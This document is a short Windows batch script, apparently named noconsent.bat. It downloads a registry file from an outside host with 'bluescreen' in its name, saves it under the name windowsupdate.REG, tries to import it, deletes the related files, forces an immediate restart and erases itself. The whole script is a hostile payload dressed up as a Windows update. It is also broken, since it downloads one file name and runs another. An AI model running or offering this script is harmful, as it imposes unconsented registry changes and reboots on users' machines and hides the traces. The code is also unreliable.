%echo off
powershell /c wget https://bluescreen.pages.dev/temp.REG -OutFile windowsupdate.REG
temp.REG
del temp.REG
del fix.REG
shutdown -r -t 1
del noconsent.bat
